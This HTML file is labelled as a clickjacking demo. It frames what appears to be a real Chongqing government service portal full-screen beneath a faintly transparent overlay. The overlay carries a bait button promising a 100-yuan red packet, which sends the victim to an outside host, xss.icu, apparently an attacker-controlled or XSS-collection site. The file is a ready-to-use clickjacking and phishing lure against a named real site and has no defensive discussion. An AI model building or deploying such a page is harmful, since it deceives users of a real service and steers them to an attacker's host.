<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>点击劫持演示（登录页-20%透明+跳转版）</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            overflow: hidden;
        }
        /* 目标页面 */
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
        }
        /* 前景20%透明遮罩 */
        .mask {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.2);
            z-index: 2;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        /* 红包按钮 */
        .red-packet {
            width: 220px;
            height: 300px;
            background: linear-gradient(135deg, #e53935, #ff5252);
            border-radius: 16px;
            color: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            box-shadow: 0 10px 30px rgba(229, 57, 53, 0.4);
            cursor: pointer;
            z-index: 3;
        }
        .red-packet .title {
            font-size: 28px;
            font-weight: bold;
            margin-bottom: 15px;
        }
        .red-packet .desc {
            font-size: 16px;
            opacity: 0.95;
        }
    </style>
</head>
<body>
    <!-- 目标登录页 -->
    <iframe src="https://ywt.scjgj.cq.gov.cn/"></iframe>

    <!-- 20%透明遮罩+红包诱导层 -->
    <div class="mask">
        <div class="red-packet" onclick="window.location.href='https://xss.icu/4e35e3'">
            <div class="title">百元红包</div>
            <div class="desc">点击立即领取</div>
        </div>
    </div>
</body>
</html>
